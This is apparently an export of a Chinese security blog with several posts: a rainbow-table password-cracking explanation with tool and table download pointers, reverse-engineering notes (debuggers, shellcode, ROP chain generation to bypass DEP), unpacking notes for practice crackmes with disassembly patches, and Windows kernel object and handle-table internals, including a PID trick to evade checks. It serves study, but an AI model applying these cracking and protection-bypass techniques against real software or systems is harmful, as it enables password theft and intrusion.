<h3 id="查表过程"><a href="#查表过程" class="headerlink" title="查表过程"></a>查表过程</h3><p>&ensp;&ensp;&ensp;&ensp;如果已经有了上文图一中生成的彩虹表，怎样找到hash函数H的一条密文re3xes对应的明文呢？解释这个破解过程需要明确一点：如果re3xes对应的明文属于彩虹表中的某条链，那么就有可能找到其对应的明文，注意这里的“属于某条链”不仅仅是指属于彩虹表的一条链中存放的头尾两个字符串，还包括这两个字符串中的中间数据，图一中中间计算的明文数据secret、jimbo也算是属于彩虹表的第一条链中，同理bernie、zurich属于第二条链，culture、crypto属于最后一条链，虽然彩虹表中只保存了每条链的链首链尾两个字符串，但是这些中间数据是可以根据链首字符串重新计算出来的。来看一下re3xes的破解过程，先猜测下密码re3xes对应的明文数据是某条链中间计算出数据的最后一个，注意第一、二条链的中间数据中的最后一个明文口令jimbo、zurich，依次经过H-R3运算得到保存的链尾字符串rootroot、myname，那么密文re3xes经过R3转换之后得到的数据就是某条链的链尾字符串，这点应该不难理解，如密文v0d$x对应的明文jimbo是第一条链最后一个中间明文数据，则v0d$x经过R3转换得到链尾字符串rootroot，但是密文re3xes经过R3函数转换之后得到的rambo并不是表中保存的任一条链的链尾字符串，这就说明re3xes对应的明文数据并不是某条链中间计算出数据的最后一个，猜测不成立，继续猜测re3xes对应的明文数据可能是某条链中间计算出数据的倒数第二个，同样可以很容易推出re3xes依次经过R2-H-R3转换之后得到的数据是某条链的链尾字符串，计算出re3xes经R2-H-R3转换的结果为linux23，通过搜索彩虹中存放的链尾字符串，得到linux23恰好是最后一条链的链尾，O(∩_∩)O~，到了这一步已经成功了一大半，下面就来根据存储的最后一条链链首的passwd重新计算出密文re3xes对应的明文吧，既然re3xes经R2-H-R3转换之后得到链尾的linux23，那么链首的passwd经H-R1-H运算后的结果culture就是re3xes对应的明文啦，小功告成~(≧▽≦)/~，流程图见下图2。
<center>
    <img style="border-radius: 0.3125em;
    box-shadow: 0 2px 4px 0 rgba(34,36,38,.12),0 2px 10px 0 rgba(34,36,38,.08);" 
    src=图2.jpg>
    <br>
    <div style="color:orange; border-bottom: 1px solid #d9d9d9;
    display: inline-block;
    color: #999;
    padding: 2px;">图2 彩虹表破解密码示意图</div>
</center>
<p>&ensp;&ensp;&ensp;&ensp;注意：经过这种运算能得到链尾字符串的话只是成功了大半，还是有一小半人品不好的情况额，如果Rk函数设计的不好，存在一个密文字串qshud和re3xes经过R2-H-R3运算后都能得到linux23，那么在破解密文qshud的时候也会得出明文为culture，这种错误的情况称为“假警”，因为实际应用中的数据量都比较大，所以出现这种情况也是很正常的，这是只需要简单计算一下hash验证下即可，从另一个角度看数据量大的同时也能保证彩虹表的明文覆盖率更大，破解效果更好，出现“假警”情况的话就继续查表过程直至找到正确的明文或是找完整个表也没找到明文╮(╯_╰)╭……
<p>&ensp;&ensp;&ensp;&ensp;ps：彩虹表类似于用大量随机字符串来保证对明文的覆盖率，所以Rk系列函数的构造直接影响能破解密码的范围。

<h2 id="彩虹表的不足与改进"><a href="#彩虹表的不足与改进" class="headerlink" title="彩虹表的不足与改进"></a>彩虹表的不足与改进</h2><h3 id="不足：加盐情况处理不好"><a href="#不足：加盐情况处理不好" class="headerlink" title="不足：加盐情况处理不好"></a>不足：加盐情况处理不好</h3><p>&ensp;&ensp;&ensp;&ensp;现在很多加密方法计算密码Hash时，会在待处理的明文字符串后面加上一串随机的字符串再进行加密操作，开始密码验证时会先在用户输入的密码后加上相同的随机字串进行加密，结果再与存储的Hash进行比较。如明文口令是qshud，则附加上一段随机字符串再计算hash，正确口令的hash存储时也是这样的处理过程，这样做的一个好处就是可以在一定程度上防止彩虹表破译，假设随机字符串为“！@#￥”之类的特殊符号，在造表的过程中设计R函数就需要考虑到映射回这些特殊符号，这就大大增大了造表的空间和难度。

<h3 id="不足：不能保证100-破解"><a href="#不足：不能保证100-破解" class="headerlink" title="不足：不能保证100%破解"></a>不足：不能保证100%破解</h3><p>&ensp;&ensp;&ensp;&ensp;造表过程中可以很明显的看出，只有明文字符串属于彩虹表的某条链上才能保证这条明文对应的Hash可以被破解，然而设计的再好也不能保证能够破解所有对应的Hash密码，实际中破解率99%以上就已经很实用了。

<h3 id="改进：破解率100-的雷表"><a href="#改进：破解率100-的雷表" class="headerlink" title="改进：破解率100%的雷表"></a>改进：破解率100%的雷表</h3><p>&ensp;&ensp;&ensp;&ensp;上文已经提到了破解的效率并不能达到100%，而雷表就是对这点的改进，据称可以达到100%的破译，但是涉及的技术会更加复杂。目前这项技术还未被公开，网上也找不到详细的介绍。

<h3 id="改进：显卡并行编程加速造表过程"><a href="#改进：显卡并行编程加速造表过程" class="headerlink" title="改进：显卡并行编程加速造表过程"></a>改进：显卡并行编程加速造表过程</h3><p>&ensp;&ensp;&ensp;&ensp;利用显卡多核的特点，设计并行的造表算法（CUDA并行编程），一般情况下能将造表速度提至7倍（以我一个很水的实现为起点~囧）或更高。

<h2 id="彩虹表下载及相关工具"><a href="#彩虹表下载及相关工具" class="headerlink" title="彩虹表下载及相关工具"></a>彩虹表下载及相关工具</h2><h3 id="免费彩虹表下载："><a href="#免费彩虹表下载：" class="headerlink" title="免费彩虹表下载："></a>免费彩虹表下载：</h3><p>&ensp;&ensp;&ensp;&ensp;Free Rainbow Tables：http://www.freerainbowtables.com/en/tables/，提供了LM、NTLM、MD5、SHA1等彩虹表下载。

<h3 id="工具："><a href="#工具：" class="headerlink" title="工具："></a>工具：</h3><p>&ensp;&ensp;&ensp;&ensp;Opcrack：有自己独特的彩虹表结构，支持LM，NTLM破解。
<p>&ensp;&ensp;&ensp;&ensp;RainbowCrack：可以自己造表，支持LM, NTLM, MD5, SHA1, MYSQLSHA1,              HALFLMCHALL, NTLMCHALL的破解。
<p>&ensp;&ensp;&ensp;&ensp;Cain：由Oxid.it开发的一个针对Microsoft操作系统的免费口令恢复工具。号称穷人使用的L0phtcrack……]]></content>
      <categories>
        <category>密码算法</category>
      </categories>
      <tags>
        <tag>彩虹表</tag>
        <tag>Hash算法</tag>
      </tags>
  </entry>
  <entry>
    <title>2014-01-05-逆向笔记【壹】</title>
    <url>/2014/01/05/2014-01-05-%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0%E3%80%90%E5%A3%B9%E3%80%91/</url>
    <content><![CDATA[<ol>
<li><p>常见压缩壳：UPX、ASPACK、NSPACK。</p>
</li>
<li><p>常见加密壳：Asprotect、Zprotect、Yoda、Telock、Svkp。</p>
</li>
<li><p>常见虚拟机保护壳：Vmprotect、Themida、WinLicense 。</p>
<a id="more"></a></li>
<li><p>常用动态调试工具：ollydbg、Immunitydbg、Windbg，其中ollydbg使用最多，逆向必备，Immunitydbg为Immunity公司对ollydbg之后的改进版，支持Python脚本，但是断点不能保存，更适合漏洞利用领域，Windbg界面不甚友好，但是微软自家的东西对windows系统支持很好，调试内核驱动程序必备，三者都支持自定义脚本编写。</p>
</li>
<li><p>常用静态分析工具：Win32Dasm、Ida pro，Win32Dasm已经停止更新了，Ida功能更强更常用，结合hex插件反编译出C程序代码的效果极佳哦。</p>
</li>
<li><p>Peid是目前最常用的查壳类型的工具，内置有外壳特征库及识别算法，也可以自己下载特征库自制查壳工具。</p>
</li>
<li><p>DeDe是逆向分析Delphi及Brond C++程序的利器，可以看到窗体及其它资源的信息，还可以查看对应按钮等的处理程序，便于快速定位分析。</p>
</li>
<li><p>机器码：用二进制代码表示的计算机能直接识别和执行的一种机器指令的集合，一般反汇编出的结果为16进制显示，如空指令nop的机器码为90（16进制）;</p>
</li>
<li><p>断点：调试器的功能之一，可以让程序中断在需要的地方，常用的断点包括：INT3断点（也称软断点）、硬件断点（利用CPU的调试寄存器设置）、内存断点（利用操作系统的缺页异常处理机制）、消息断点、条件断点等。</p>
</li>
<li><p>硬件断点利用CPU的调试寄存器，最多只能设置4个，在软断点被检测的多时下硬件断点和内存断点也是极好的。</p>
</li>
<li><p>调试器的单步跟踪是结合的调试器软断点机制，在调试器中实现的逐指令或逐过程执行程序。</p>
</li>
<li><p>父进程：指已创建一个或多个子进程的进程，调试器如Ollydbg一般使用打开或附加的方式调试程序，调试器就作为调试程序的父进程，一般正常的应用程序是由explorer.exe创建的，父进程就是explorer.exe等，可以利用这个特点做反调试。</p>
</li>
<li><p>堆栈平衡定律：手工脱壳时利用外壳程序首先需要保存原程序的入口信息（寄存器、堆栈使用情况等），通过标记刚加载时入口点的堆栈位置，等外壳程序恢复原程序的ESP寄存器值的时候，一般就到了OEP位置附近。</p>
</li>
<li><p>内存访问断点：根据操作系统的内存管理机制，经常未使用的内存页不会放置在缓存中，当程序需要访问到该页内存时就会触发缺页异常，就会交给调试器处理，而外壳程序完成原程序各个区段的解压操作之后会跳转到原程序开始执行，在使用Ollydbg调试器手工脱壳时，可以手工设置内存访问断点，当程序解压完某个区段之后会自动中断在缺页异常处，再进行单步跟踪就能到达OEP处。</p>
</li>
<li><p>shellcode：一段完成特定功能的代码，一般用于获取主机权限，常见的有新建用户、弹出消息框（测试用）、绑定端口等，与溢出漏洞联系紧密，经常在利用漏洞获取程序控制权之后执行得到被攻击主机的部分权限。</p>
</li>
<li><p>网页挂马一般利用浏览器或其插件在解析特定网页过程中的漏洞控制浏览器程序流程执行shellcode（一般为反弹连接或是下载并执行恶意程序的功能），用户在使用浏览器访问不明链接时就可能成为被控制的“肉鸡”，现在国内主机WindowsXp+IE8的仍然占很大分量，很危险(⊙o⊙)哦，Windows7下则安全的多。</p>
</li>
<li><p>软件加壳过程一般是将原程序的代码数据等压缩或加密处理，在程序中新建一个区段存放外壳代码，并修改程序入口使外壳部分代码先于原程序开始执行，在完成原程序数据的解压缩或解密之后再跳转到原程序的代码执行。</p>
</li>
<li><p>内存偏移地址：也叫VA，在保护模式下程序被加载到内存后，操作系统为其分配了自己独立的4GB虚拟内存空间，在这个空间定位的地址就称为虚拟内存地址，范围为0×00000000~0xffffffff，相对于0×00000000的偏移称为内存偏移地址。</p>
</li>
<li><p>区段：也可以称为“节”、“区块”，用于存放可执行程序不同类型数据的地方，如代码段、数据段、资源段等，将程序的数据放置在不同的区段可以设置不同的权限便于管理，实际存放的数据类型或区段名称可以根据根据需要灵活设置。</p>
</li>
</ol>
]]></content>
      <categories>
        <category>基础理论</category>
      </categories>
      <tags>
        <tag>工具</tag>
        <tag>原理</tag>
      </tags>
  </entry>
  <entry>
    <title>2014-02-28-逆向笔记【贰】</title>
    <url>/2014/02/28/2014-02-28-%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0%E3%80%90%E8%B4%B0%E3%80%91/</url>
    <content><![CDATA[<ol>
<li>PE文件各区段解释(区段名称跟功能没有必然关系，这里只是说明常见的定义)：</li>
</ol>
<ul>
<li>.code或.text段：存放程序的代码数据。</li>
<li>.data段：存放程序运行使用的数据。</li>
<li>.rdata或.idata段：程序的导入表数据。</li>
<li>.edata段：程序的导出表所在的节。</li>
<li>.rsrc段 :程序资源节，为多层的二叉排序树，节点指向PE文件的各种类型资源（图标、对话框、菜单等）。</li>
<li>.reloc段：重定位表所在的节，实际加载基址改变之后，程序里的有些数据（如部分全局变量等）地址是写死的，程序加载时将这些数据的地址更新，重定位表就用来存放需要重定位的数据信息。<a id="more"></a></li>
</ul>
<ol start="2">
<li><p>Windbg界面不怎么友好（看雪提供有Windbg高亮插件），且Windbg刚加载程序时是在系统断点处断下的，可以载入程序之后在命令行设置断点bp $exentry，再运行就会在程序的入口点断下的。</p>
</li>
<li><p>将Windbg设置为默认调试器的方法为在命令行转到Windbg程序的目录下，输入Windbg –I，如果Windbg.exe的目录已经添加到了系统环境变量里，就不用再Cd进Windbg程序的目录了。设置默认调试器可以在程序出现异常时自动挂载程序到出异常的位置，在调试漏洞Poc时非常有用，如果Poc触发了异常就会自动调用Windbg到出问题的代码处。</p>
</li>
<li><p>Windbg进行本地内核调试时需要将系统的调试开关打开，命令为：bcdedit -debug on ，重启生效，同理：bcdedit -debug off为关闭调试开关。</p>
</li>
<li><p>使用Windbg进行源代码调试驱动程序时必须首先安装与系统相对应的符号文件，如果驱动程序对应的源码名称为QS2HU4.c，在驱动的入口设置断点的命令为bp QS2HU4!DriverEntry，其中QS2HU4为源码文件名、DriverEntry为驱动的入口函数名（相当于C程序中的Main函数），使用WinDbg打开QS2HU4.c文件之后再加载驱动，就会在源码中DriverEntry函数哪一行断下。（Windbg根据符号文件找出DriverEntry函数位置~）。</p>
</li>
<li><p>Windbg调试驱动程序出现蓝屏时，可以根据提示输入并执行!analysis -v，查看系统崩溃的详细信息，比如错误码C0000005代表非法内存访问等，虽然也能将定位到出现错误的源代码中的行或具体的某句汇编指令，但是情景复杂的情况往往需要进行栈回溯等等方法寻找出错的根源。</p>
</li>
<li><p>Windbg中查看错误码含义的指令为!error 错误码。例如!error  2。</p>
</li>
<li><p>栈溢出主要有覆盖返回地址、覆盖虚表指针、覆盖SEH异常处理链表等形式。</p>
</li>
<li><p>堆溢出一般发生在指针拆卸出错，可造成固定地址写任意数据、任意地址写固定数据、任意地址写任意数据等，目前此类型漏洞在Windows系列操作系统中发生的不多，在xp sp2之前的操作系统可以通过向系统关键地址处如进程控制块中的指针等。Ps：路由器操作系统中利用堆溢出漏洞进行拒绝服务攻击甚至是远程代码执行还很常见。</p>
</li>
<li><p>为了绕过Windows xp sp2及以上操作系统的dep保护机制，可以利用Immunity Debugger调试器的mona插件可以自动生成Rop链（好像是findantidep插件的升级版），当然可能还需要进行手工调试修正，首先把mona插件的python脚本下到手之后放到Immunity Debugger的plugin目录下即可。</p>
</li>
<li><p>在Immunity Debugger的命令行输入!mona rop -m msvcr71.dll -n（前提是笔记十）。-m选项代表从后面的msvcr71.dll中获取rop链，-n代表过滤掉null byte，也就是“\X00”,避免Rop数据被类似strcpy的字符串拷贝函数拷贝时被截断出错，命令执行之后就可以得到ruby、python等各种语言格式的Rop链啦~</p>
</li>
<li><p>在使用Immunity Debugger的mona插件时，注意生成的Rop链中如果带有Ascll字样，代表构成Rop的这些数组的每一个字节的十六进制值都是小于0x80(128)的，也就是在Ascll字符表示范围内，使用这种Rop链的一个好处就是可以避免MultiByteToWideChar和WideCharToMutiByte函数对输入数据的ANSIC与宽字符之间的转换，如果漏洞利用调试过程中自己的利用代码出现了类似的小意外不妨从这里找找原因。</p>
</li>
<li><p>IDA：有时候感觉用IDA的图形视图看汇编代码真是一种享受，不过IDA的强大之处还不止此，不仅可以对字符串、函数找到其交叉参考（查看该字符串或函数的调用情况，便于追根溯源），还有出色的代码标注功能及N多强大的插件(⊙o⊙)哦，比如：hexray……</p>
</li>
<li><p>IDA的hexray插件功能非常强大，可以将汇编代码反编译成的类c语言的伪代码，用法也非常简单：在某调用函数反汇编代码的图形视图按下F5键就有惊喜(⊙o⊙)哦（在反汇编代码视图中光标选定位置F5之后就会得到光标所在函数的反编译代码），这技术还不是非常成熟，但是IDA反编译出的结果还算准确，测试时可以把int 3指令反编译成debugbreak()。（最好不要滥用该技能，建议老老实实的看汇编代码，慢慢打基础）。</p>
</li>
<li><p>IDA以静态反汇编出名，也可以进行调试分析的，看菜单工具栏选项或F9快捷键体验一下吧，个人感觉效果、功能虽不如od的动态调试，图形视图下的调试还算不错的，结合Windbg调试就更爽了。。。</p>
</li>
<li><p>如果一些窗体程序使用起来不合你的胃口，比如说对话框太小了、图片太丑了，先不用考虑放弃这个程序，试试ResHacker、eXeScope等资源编辑工具吧，操作简单，还能将一些灰色按钮的限制功能取消掉（找到相应的属性，修改之后再Rebuild），也是进行汉化操作等的利器。</p>
</li>
<li><p>程序加载到内存时需要根据导入表的结构将程序运行所需要的API函数地址填充到IAT（导入函数地址表）的地址，程序运行时导入表的结构是用不到的，所以一些外壳程序会把导入表结构销毁掉，如果在脱壳过程中对其进行Dump内存镜像的操作之后，得到的程序就没有导入表结构，无法提供程序运行时的API地址信息，导致出错。这也就是为什么Dump内存镜像之后要进行导入表修复操作。</p>
</li>
<li><p>硬件断点：常用的CPU都有8个调试寄存器Dr0-Dr7，其中Dr0-Dr3用于存放设置硬件断点的地址（所以硬件断点最多只能设置四个），Dr4-Dr5一般用于保留，Dr6-Dr7用于指示硬件断点的设置个数及属性（读、写中断）等。</p>
</li>
</ol>
]]></content>
      <categories>
        <category>基础理论</category>
      </categories>
      <tags>
        <tag>工具</tag>
        <tag>原理</tag>
      </tags>
  </entry>
  <entry>
    <title>2015-04-01-吾爱破解脱壳练习笔记</title>
    <url>/2015/04/01/2015-04-01-%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E8%84%B1%E5%A3%B3%E7%BB%83%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<blockquote>
<p>主要记录吾爱破解脱壳练习集的部分练习过程及脱壳方法总结，对关键点记录备忘，实际上脱壳需要看壳所具体开启的保护措施（如穿山甲及Pespin的Debug-Block）。除穿山甲及部分壳记录遗失或未记录外整体总结不够完整，还有三四款未做深入研究，待有需求时再做记录补充。</p>
</blockquote>
<p>6 ：telock笔记<br>方式一：<br>最后一次异常法记录最后一次异常的位置，然后设置代码段内存访问断点。运行即在OEP处断下，dump之后使用importrec的telock插件修复即可。</p>
<a id="more"></a>
<p>方式二：<br>如果要是想手工绕过IAT加密，可以在程序运行之后查看IAT的起始位置，重新运行程序，在程序已经执行过硬件断点检查之后再设置对IAT的硬件读或访问断点。<br>运行到类似指令：<br>004698E7    8B85 53384000   mov eax,dword ptr ss:[ebp+403853]<br>004698ED    40              inc eax<br>004698EE    0F84 A8000000   je UnPackMe.0046999C<br>004698F4    80A5 FC2F4000 F&gt;and byte ptr ss:[ebp+402FFC],0FF<br>004698FB    0F84 9B000000   je UnPackMe.0046999C<br>00469901    80A5 FD2F4000 F&gt;and byte ptr ss:[ebp+402FFD],0FF<br>00469908    0F84 8E000000   je UnPackMe.0046999C<br>将004698FB及00469908处的je改成jne即可，再代码节断点结合最后一次异常法即可到OEP，之后就不用修复导入表了。</p>
<p>8 ：molebox：<br>用oep定律可以直接到oep，但是这样的话importrec的修复不好。<br>手工绕过IAT加密的方法如下：<br>记录被加密的IAT地址，如dd 455170，设置硬件访问断点，在一次赋值之后断下：<br>00455170  7C801D53  kernel32.LoadLibraryExA<br>从此开始单步跟踪，不取消断点：<br>00471666    FF15 40D84700   call dword ptr ds:[47D840]               ; kernel32.VirtualProtect<br>0047166C    85C0            test eax,eax<br>0047166E    75 0A           jnz short UnPackMe.0047167A<br>00471670    B9 0B0000EF     mov ecx,EF00000B<br>00471675    E8 9D2F0000     call UnPackMe.00474617<br>0047167A    8B4D 08         mov ecx,dword ptr ss:[ebp+8]<br>0047167D    8B55 F8         mov edx,dword ptr ss:[ebp-8]<br>00471680    8B02            mov eax,dword ptr ds:[edx]<br>00471682    8901            mov dword ptr ds:[ecx],eax<br>到了此处之后将00471682处修改IAT的指令给nop掉。到了oep之后dump即可。</p>
<p>9 : CRYPToCRACk：<br>手工绕过IAT加密的方法如下：<br>记录被加密的IAT地址，如dd 45512c。设置硬件访问断点：<br>00468331    5A              pop edx                                  ; UnPackMe.0045512C<br>00468332    59              pop ecx                                  ; UnPackMe.0045512C<br>00468333    5B              pop ebx                                  ; UnPackMe.0045512C<br>00468334    8B7C24 04       mov edi,dword ptr ss:[esp+0x4]           ; UnPackMe.00468384<br>00468338    893C8A          mov dword ptr ds:[edx+ecx<em>4],edi         ; UnPackMe.00468384<br>0046833B    807F 05 55      cmp byte ptr ds:[edi+0x5],0x55<br>在0046833B断下，修改00468338为mov dword ptr ds:[edx+ecx</em>4],eax，并新建eip即可绕过IAT加密。<br>同样ESP定律到达OEP。有时候会到达OEP的下一条指令。手工简单修复下堆栈及寄存器即可。</p>
<p>10 : pespin笔记：<br>记录esp值如12ffc4，给VirtualProtect下memory access断点，可以看到有检查CC断点，不用管继续运行到VirtualProtect调用。运行到返回之后给之前的ESP-4=12ffc0值设置硬件访问断点。<br>断下来之后单步可见到以下形式的stolen code：<br>oep format:<br>xxx<br>jmp to yyy<br>yyy<br>jmp to zzz<br>记录并修复入口即可。</p>
<p>13：GHF Protector笔记<br>给VirtualAlloc和VirtualProtect下断点，很快就可以到达第二层壳的位置，再利用ESP定律就可以到达真正的OEP，用LoadPE进行Dump时需要取消勾选 《完整转存：从磁盘粘贴文件头》  再用importrec修复时需要注意取消勾选《活动进程信息 使用来自硬盘的PE头》。</p>
<p>14及18：Armadillo穿山甲<br>其实对OpenMutex函数下断，更改其第二次打开同名互斥量返回值即可快速将双进程变单进程，看到的其它方式略复杂。</p>
<p>15: ACProtector<br>内存访问断点，直接两次到OEP，修复即可。</p>
<p>16：Acprotect<br>内存访问断点，注意第一个下到原程序的数据段，第二个下到原程序代码段。不宜下到壳的段（第15个也类似）。</p>
<p>17：PEBundle<br>ESP定律直接到OEP：<br>修复IAT时候看无效IAT的栈地址，重新运行下硬件访问断点。<br>单步不久看到此处判断是否加密IAT，je改成下图的jmp<br>00471FBF    85C0            test eax,eax<br>00471FC1    EB 25           jmp short UnPackMe.00471FE8<br>00471FC3    51              push ecx<br>od的自带就可以修复。</p>
<p>19：PUNiSHER<br>data-code访问断点，断下后获取导入函数地址再运行到：<br>003C0890   /EB 33           jmp short 003C08C5</p>
<p>009F022E    64:A1 00000000  mov eax,dword ptr fs:[0]<br>009F0234    50              push eax<br>009F0235    64:8925 0000000&gt;mov dword ptr fs:[0],esp<br>009F023C    83EC 68         sub esp,68<br>009F023F    53              push ebx<br>009F0240    56              push esi<br>009F0241    57              push edi<br>009F0242    8965 E8         mov dword ptr ss:[ebp-18],esp<br>009F0245    33DB            xor ebx,ebx<br>009F0247    895D FC         mov dword ptr ss:[ebp-4],ebx<br>009F024A    EB 04           jmp short 009F0250</p>
<p>009F02B7    90              nop<br>009F02B8    FF15 7C214000   call dword ptr ds:[40217C]               ; msvcrt.<strong>set_app_type<br>009F02BE    59              pop ecx<br>009F02BF    830D 3C314000 F&gt;or dword ptr ds:[40313C],FFFFFFFF<br>009F02C6    830D 40314000 F&gt;or dword ptr ds:[403140],FFFFFFFF<br>009F02CD    FF15 78214000   call dword ptr ds:[402178]               ; msvcrt.</strong>p__fmode<br>009F02D3    8B0D 30314000   mov ecx,dword ptr ds:[403130]<br>009F02D9    8908            mov dword ptr ds:[eax],ecx<br>009F02DB    FF15 74214000   call dword ptr ds:[402174]               ; msvcrt.<strong>p</strong>commode<br>009F02E1    8B0D 2C314000   mov ecx,dword ptr ds:[40312C]<br>009F02E7    8908            mov dword ptr ds:[eax],ecx<br>009F02E9    A1 70214000     mov eax,dword ptr ds:[402170]<br>009F02EE    8B00            mov eax,dword ptr ds:[eax]<br>009F02F0    A3 38314000     mov dword ptr ds:[403138],eax<br>009F02F5    EB 04           jmp short 009F02FB</p>
<p>009F0301    E8 06000000     call 009F030C</p>
<p>009F0360    FFD4            call esp</p>
<p>20：未知壳<br>00401F39   .  E8 8AFEFFFF   call UnPackMe.00401DC8                   ; \CreateProcessA</p>
]]></content>
      <categories>
        <category>脱壳破解</category>
      </categories>
      <tags>
        <tag>telock</tag>
        <tag>molebox</tag>
        <tag>CRYPToCRACk</tag>
        <tag>pespin</tag>
        <tag>GHF Protector</tag>
        <tag>ACProtect</tag>
        <tag>PEBundle</tag>
        <tag>PUNiSHER</tag>
      </tags>
  </entry>
  <entry>
    <title>2015-12-18-内核对象结构简介</title>
    <url>/2015/12/18/2015-12-18-%E5%86%85%E6%A0%B8%E5%AF%B9%E8%B1%A1%E7%BB%93%E6%9E%84/</url>
    <content><![CDATA[<blockquote>
<p>&ensp;&ensp;&ensp;&ensp;内核对象包括多种进程对象、文件对象等等，应用层每次创建或打开进程、文件都会对相应的内核对象创建一个句柄（进程的pid值其实就是该进程内核对象的句柄），这个句柄其实就是一个索引值，在通过句柄操作内核对象时，由内核根据该句柄值查找句柄表，定位内核对象的位置，最终完成相应操作。
</blockquote>
<a id="more"></a>
<p>&ensp;&ensp;&ensp;&ensp;系统所有有名的内核对象按散列表的方式保存在ObpRootDirectoryObject指针指向的对象目录表中：

<p><img src="%E5%9B%BE1.jpg" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;其中HashBuckets数组每个元素都指向一个_OBJECT_DIRECTORY_ENTRY结构：

<p><img src="%E5%9B%BE2.jpg" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;ChainLink指向下一个_OBJECT_DIRECTORY_ENTRY结构，Object表示所存放的内核对象，HashValue则是其散列值。因为对象目录本身也是一种内核对象，在Windbg中可以直接查看该对象详细信息，下图中可以看出!object可以列出对象目录信息及Hash表中不为空的表项。在编程实现遍历对象目录时需要注意递归调用遍历函数，避免遗漏，其实编程遍历对象目录的结果和WinObj查看的结果印象里是一样的。

<p><img src="%E5%9B%BE3.jpg" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;下面以进程对象为例介绍内核对象结构，进程的内核对象地址指的就是进程的_EPROCESS结构（文件内核对象指的是_FILE_OBJECT结构,其它对象都有相应的结构），下面先来看看explorer进程的_EPROCESS结构：

<p><img src="%E5%9B%BE4.jpg" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;部分结构：

<p><img src="%E5%9B%BE5.jpg" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;因为不同内核对象类型所对应的结构都不一样，为了方便识别内核对象类型，所有内核对象头部前0x18字节存放内核对象头信息：

<p><img src="%E5%9B%BE6.jpg" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;注意偏移0xC偏移处的TypeIndex成员，代表内核对象类型所在类型表中的偏移，在vista以前的系统上，_OBJECT_HEADER中是没有该成员的，而是直接存放一个_OBJECT_TYPE结构表示对象类型。所以在Win7及以上系统就需要根据索引值在全局符号变量ObTypeIndexTable中定位对象所指示的类型，可以看到_OBJECT_TYPE中Name字符串表示是进程对象：

<p><img src="%E5%9B%BE7.jpg" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;这和直接查看进程对象类型指针得到的地址也是一样的：

<p><img src="%E5%9B%BE8.jpg" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;在处理其他内核对象时也可以根据这种方式判断出所要处理的对象类型是什么，不过在编写相关程序时需要注意要根据特征搜索出ObTypeIndexTable地址，如果是调试时可以直接在Windbg中直接根据_EPROCESS结构直接查看对象类型：

<p><img src="%E5%9B%BE9.jpg" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;其中HandleCount和PointerCount分别表示句柄和内核对象的引用计数。
<p>&ensp;&ensp;&ensp;&ensp;最后需要注意下_OBJECT_TYPE类型的TypeInfo结构的其他成员：

<p><img src="%E5%9B%BE10.jpg" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;其中OpenProcedure等相关结构可以指定打开进程也就是OpenProcess时调用的回调函数，替换之后也可以做到很多事情，比如监控进程创建等。
]]></content>
      <categories>
        <category>系统内核</category>
      </categories>
      <tags>
        <tag>内核原理</tag>
        <tag>系统机制</tag>
      </tags>
  </entry>
  <entry>
    <title>2015-12-19-句柄与句柄表结构简介</title>
    <url>/2015/12/19/2015-12-19-%E5%8F%A5%E6%9F%84%E4%B8%8E%E5%8F%A5%E6%9F%84%E8%A1%A8%E7%BB%93%E6%9E%84/</url>
    <content><![CDATA[<blockquote>
<p>&ensp;&ensp;&ensp;&ensp;这里说的句柄指内核对象的句柄，窗口句柄hWnd等是另外的管理结构，不牵扯内核对象，系统的句柄表主要有三种，第一种是系统全局PspCidTable句柄表，保存所有进程和线程的句柄，第二种是进程内部句柄表，保存该进程所打开的内核对象句柄，最后一种是系统进程system的全局句柄表，这几种句柄表对应的格式都是一样的。
</blockquote>
<a id="more"></a>
<h2 id="句柄表结构及PspCidTable"><a href="#句柄表结构及PspCidTable" class="headerlink" title="句柄表结构及PspCidTable"></a>句柄表结构及PspCidTable</h2><p>&ensp;&ensp;&ensp;&ensp;以PspCidTable句柄表为例查看句柄表结构，该句柄表存放所有进程、线程的句柄：

<p><img src="%E5%9B%BE1.jpg" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;TableCode为0x8f122001，后三位值1代表是二级表（0为一级表、2为三级表）。WindowsXP及以上系统都是采用的动态3层句柄表，句柄数超过一级表的容量时，就会扩展为二级表，此时二级表中放的是指向一级表的指针，这个TableCode的值去掉后三位的值0x8f122000指向一级表基址，如图0x8f122000地址存放了两个一级表的指针：

<p><img src="%E5%9B%BE2.jpg" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;在一级表0x8a204000中存放的每个_HANDLE_TABLE_ENTRY结构占8字节，前四个字节0x865ccab1去掉后三位标志位之后的0x865ccab0即指向一个_EPROCESS结构（其实是system进程对象）：

<p><img src="%E5%9B%BE3.jpg" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;为嘛句柄表中第一个结构对应的是System进程？在我Win7系统上System进程的PID值为4。因为句柄值的低两位用来用来存储该索引对应的句柄表的层次，所以实际的句柄值都是4的倍数，除以4才能得到在句柄表中的实际索引，同样如果已知一个句柄值，也可以据此定位到该句柄所对应句柄表中的位置，每个句柄表最多能存储0x800=2048个_HANDLE_TABLE_ENTRY结构，如果给定Handle值为0x804，可以计算得到该句柄对应第0x804/0x800=2个句柄表项的第(0x804-0x800)/4=1个索引,选择刚才看到的两个一级表指针数组的第二个0x8f102000，一个_HANDLE_TABLE_ENTRY占8个字节，从而定位到句柄0x804对应的_HANDLE_TABLE_ENTRY，查看该对象属性可以确认句柄0x804对应的是一个线程对象：

<p><img src="%E5%9B%BE4.jpg" alt=""><br><img src="%E5%9B%BE5.jpg" alt=""></p>
<blockquote>
<p>TIPS: 实际的句柄值都是4的倍数，如果给OpenProcess等函数构造PID值5/6/7，实际上打开的进程还是PID=4的system进程，这样有时可以绕过一些限制打开PID的检查。</p>
</blockquote>
